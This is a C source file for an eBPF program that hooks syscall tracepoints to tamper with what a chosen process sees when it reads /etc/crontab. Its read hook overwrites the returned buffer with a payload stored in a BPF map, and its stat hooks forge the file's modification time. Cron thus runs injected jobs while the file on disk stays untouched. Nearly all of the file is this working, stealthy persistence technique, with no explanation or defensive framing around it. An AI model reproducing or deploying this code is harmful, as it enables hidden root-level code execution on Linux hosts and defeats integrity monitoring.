#define __x86_64__ // needed for proper stat.h layout (& probably other stuff)
                   // rule of thumb:
                   //   wrong: offsetof(struct stat, st_mtim) -> 96
                   //   right: offsetof(struct stat, st_mtim) -> 88

// note: doesn't keep track of seek position, which would get wacky w/ threads

#define _POSIX_C_SOURCE 200809L

#include <stddef.h>
#include <stdint.h>
#include <stdlib.h>

#include <linux/bpf.h>
#include <linux/stringify.h>
#include "bpf_helpers.h"

#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/sysmacros.h>
#include <unistd.h>
#include <sys/time.h>

#include "regs.h"

#define bpf_printk(fmt, ...) \
({ \
  char ____fmt[] = fmt; \
  bpf_trace_printk(____fmt, sizeof(____fmt), ##__VA_ARGS__); \
})

struct bpf_map_def SEC("maps") comm_map = {
  .type = BPF_MAP_TYPE_ARRAY,
  .key_size = sizeof(uint32_t),
  .value_size = 256,
  .max_entries = 1,
};

struct bpf_map_def SEC("maps") target_map = {
  .type = BPF_MAP_TYPE_ARRAY,
  .key_size = sizeof(uint32_t),
  .value_size = sizeof(uint64_t),
  .max_entries = 1,
};

struct bpf_map_def SEC("maps") payload_map = {
  .type = BPF_MAP_TYPE_ARRAY,
  .key_size = sizeof(uint32_t),
  .value_size = 0x1000,
  .max_entries = 1,
};

struct bpf_map_def SEC("maps") time_map = {
  .type = BPF_MAP_TYPE_ARRAY,
  .key_size = sizeof(uint32_t),
  .value_size = sizeof(uint64_t),
  .max_entries = 2,
};

static inline void bump_stat(struct stat* statbuf) {
  uint64_t t = 0; // base epoch time
  {
    uint32_t key = 0;
    uint64_t* base_time = bpf_map_lookup_elem(&time_map, &key);
    if (base_time == NULL) {
      return;
    }
    if (*base_time == 0) {
      return;
    }
    t = *base_time;
  }

  uint64_t st = 0; // base uptime (ns)
  {
    uint32_t key = 1;
    uint64_t* start_time = bpf_map_lookup_elem(&time_map, &key);
    if (start_time == NULL) {
      return;
    }
    if (*start_time == 0) {
      st = bpf_ktime_get_ns();
      *start_time = st;
    } else {
      st = *start_time;
    }
  }

  uint64_t currtime = bpf_ktime_get_ns();
  uint64_t diff = currtime - st;
  uint64_t ds = diff / 1000000000;

  time_t ts = t + ds;
  time_t n_st_mtime = ts;

  int r = 0;
  r = bpf_probe_write_user(
    &statbuf->st_mtime, &n_st_mtime, sizeof(n_st_mtime)
  );
}

static inline int is_crontab(char const* pathname) {
  char const key[] = "/etc/crontab";
  char const path[sizeof(key)];
  bpf_probe_read_str((char*)&path, sizeof(path), (void*)pathname);

  #pragma unroll
  for (size_t i=0; i<sizeof(key); i++) {
    char c = path[i];
    if (key[i] != c) {
      return 0;
    }
  }
  return 1;
}

typedef struct serialize {
  uint64_t syscall_id;
  struct pt_regs regs;
} serialize_t;

struct bpf_map_def SEC("maps") state_map = {
  .type = BPF_MAP_TYPE_HASH,
  .key_size = sizeof(uint64_t), // pid_tgid
  .value_size = sizeof(serialize_t),
  .max_entries = 32,
};

struct bpf_map_def SEC("maps") fd_map = {
  .type = BPF_MAP_TYPE_HASH,
  .key_size = sizeof(uint64_t), // ((pid << 32) || fd)
  .value_size = sizeof(int),  // fd
  .max_entries = 32,
};

static inline void save_state(struct bpf_raw_tracepoint_args *ctx) {
  uint64_t pid_tgid = bpf_get_current_pid_tgid();
  unsigned long syscall_id = ctx->args[1];
  struct pt_regs *regs = (struct pt_regs *)ctx->args[0];

  serialize_t s;
  #pragma unroll
  for (size_t i=0; i < sizeof(s); i++) {
    ((char*)&s)[i] = 0;
  }

  s.syscall_id = syscall_id;
  bpf_probe_read(&s.regs, sizeof(struct pt_regs), regs);
  bpf_map_update_elem(&state_map, &pid_tgid, &s, BPF_ANY);
}

static inline int sys_enter_newstat_hook(
    struct bpf_raw_tracepoint_args* args,
    struct pt_regs *regs,
    char const* pathname,
    struct stat* statbuf) {
  if (statbuf == NULL || pathname == NULL) {
    return 0;
  }

  if (is_crontab(pathname)) {
    save_state(args);
  }
  return 0;
}

static inline void sys_exit_newstat_hook(struct pt_regs *regs, long ret) {
  if (ret != 0) {
    return;
  }

  struct stat* statbuf = (struct stat*)regs->si;
  mode_t st_mode;
  bpf_probe_read(&st_mode, sizeof(st_mode), &statbuf->st_mode);

  if ((st_mode & S_IFMT) != S_IFREG) {
    return;
  }

  bump_stat(statbuf);
}

static inline int sys_enter_openat_hook(
    struct bpf_raw_tracepoint_args* args, struct pt_regs *ctx,
    int dirfd, char const* pathname, int flags) {

  if (dirfd != AT_FDCWD || pathname == NULL || flags != O_RDONLY) {
    return 0;
  }

  if (is_crontab(pathname)) {
    save_state(args);
  }
  return 0;
}

static inline void sys_exit_openat_hook(struct pt_regs *ctx, long ret) {
  int fd = (int)ret;
  if (fd >= 0) {
    uint64_t pid_tgid = bpf_get_current_pid_tgid();
    uint64_t key = pid_tgid & 0xffffffff00000000;
    key |= fd;
    bpf_map_update_elem(&fd_map, &key, &fd, BPF_ANY);
  }
}

static inline int sys_enter_newfstat_hook(
    struct bpf_raw_tracepoint_args* args,
    struct pt_regs *regs,
    int fd, struct stat* statbuf) {
  if (fd < 0 || statbuf == NULL) {
    return 0;
  }

  uint64_t pid_tgid = bpf_get_current_pid_tgid();
  uint64_t key = pid_tgid & 0xffffffff00000000;
  key |= fd;
  int* match = bpf_map_lookup_elem(&fd_map, &key);
  if (match != NULL && *match == fd) {
    save_state(args);
  }

  return 0;
}

static inline int sys_enter_read_hook(
    struct bpf_raw_tracepoint_args* args,
    struct pt_regs *regs,
    int fd, void *buf, size_t count) {

  if (fd < 0 || buf == NULL || count == 0) {
    return 0;
  }

  uint64_t pid_tgid = bpf_get_current_pid_tgid();
  uint64_t key = pid_tgid & 0xffffffff00000000;
  key |= fd;
  int* match = bpf_map_lookup_elem(&fd_map, &key);
  if (match != NULL && *match == fd) {
    save_state(args);
  }

  return 0;
}

static inline void sys_exit_read_hook(struct pt_regs *regs, long ret) {
  if (ret < 1) {
    return;
  }

  void* buf = (void*)regs->si;
  size_t written = ret;

  /*
  size_t count = (size_t)regs->dx;
  if (count != 0x1000) {
    return;
  }
  */

  //char b[16];
  //bpf_probe_read(b, sizeof(b), (void*)buf);
  if (/* b[0] == '#' && b[1] == ' '
    && b[2] == '/' && b[3] == 'e' && b[4] == 't' && b[5] == 'c' && b[6] == '/'
    && b[7] == 'c' && b[8] == 'r' && b[9] == 'o' && b[10] == 'n'
    && b[11] == 't' && b[12] == 'a' && b[13] == 'b' */ 1
  ) {
    uint32_t payload_key = 0;
    char* payload = bpf_map_lookup_elem(&payload_map, &payload_key);
    if (payload != NULL && payload[0] != '\0') {
      size_t c = 0x1000;
      if (c > written) {
        c = written;
      }
      bpf_probe_write_user(buf, payload, c);
    }
  }
}

static inline int sys_enter_close_hook(
    struct bpf_raw_tracepoint_args* args, struct pt_regs *ctx,
    int fd) {
  if (fd >= 0) {
    uint64_t pid_tgid = bpf_get_current_pid_tgid();
    uint64_t key = pid_tgid & 0xffffffff00000000;
    key |= fd;
    int* match = bpf_map_lookup_elem(&fd_map, &key);
    if (match != NULL && *match == fd) {
      bpf_map_delete_elem(&fd_map, &key);
    }
  }
  return 0;
}

SEC("raw_tracepoint/sys_enter")
int sys_enter_hook(struct bpf_raw_tracepoint_args *ctx) {
  {
    uint32_t key = 0;
    uint64_t* target_pid = bpf_map_lookup_elem(&target_map, &key);
    if (target_pid == NULL) {
      return 0;
    }
    if (*target_pid != 0) {
      uint64_t pid_tgid = bpf_get_current_pid_tgid();
      uint64_t pid = (uint32_t)(pid_tgid >> 32);
      if (pid != *target_pid) {
        return 0;
      }
    }
  }

  unsigned long syscall_id = ctx->args[1];
  struct pt_regs regs;
  bpf_probe_read(&regs, sizeof(regs), (void*)ctx->args[0]);

  switch (syscall_id) {
    case (0): { // read
      return sys_enter_read_hook(
                    // int fd, char* buf, size_t count
        ctx, &regs, (int)regs.di, (char*)regs.si, (size_t)regs.dx
      );
    }
    case (3): { // close
      return sys_enter_close_hook(
                    // int fd
        ctx, &regs, (int)regs.di
      );
    }
    case (4): { // stat
      return sys_enter_newstat_hook(
                    // char const* pathname, struct stat* statbuf
        ctx, &regs, (char const*)regs.di, (struct stat*)regs.si
      );
    }
    case (5): { // fstat
      return sys_enter_newfstat_hook(
                    // int fd, struct stat* statbuf
        ctx, &regs, (int)regs.di, (struct stat*)regs.si
      );
    }
    case (6): { // lstat
      // reusing stat hooks for lstat, they ignore symlinks in the exit hook
      return sys_enter_newstat_hook(
                    // char const* pathname, struct stat* statbuf
        ctx, &regs, (char const*)regs.di, (struct stat*)regs.si
      );
    }
    case (257): { // openat
      return sys_enter_openat_hook(
                    // int dirfd, char const* pathname, int flags
        ctx, &regs, (int)regs.di, (char const*)regs.si, (int)regs.dx
      );
    }
    default: {
      return 0;
    }
  }

  return 0;
}

SEC("raw_tracepoint/sys_exit")
int sys_exit_hook(struct bpf_raw_tracepoint_args *ctx) {
  uint64_t pid_tgid = bpf_get_current_pid_tgid();
  serialize_t* s = bpf_map_lookup_elem(&state_map, &pid_tgid);
  if (s == NULL) {
    return 0;
  }
  long ret = (long)ctx->args[1];

  switch (s->syscall_id) {
    case (0): { // read
      sys_exit_read_hook(&s->regs, ret);
      break;
    }

    case (4): { // stat
      sys_exit_newstat_hook(&s->regs, ret);
      break;
    }
    case (5): { // fstat
      sys_exit_newstat_hook(&s->regs, ret); // no need to implement a different one
      break;
    }
    case (6): { // lstat
      sys_exit_newstat_hook(&s->regs, ret); // ditto
      break;
    }
    case (257): { // openat
      sys_exit_openat_hook(&s->regs, ret);
    }
    default: {
      break;
    }
  }
  bpf_map_delete_elem(&state_map, &pid_tgid);

  return 0;
}

char _license[] SEC("license") = "Dual BSD/GPL";
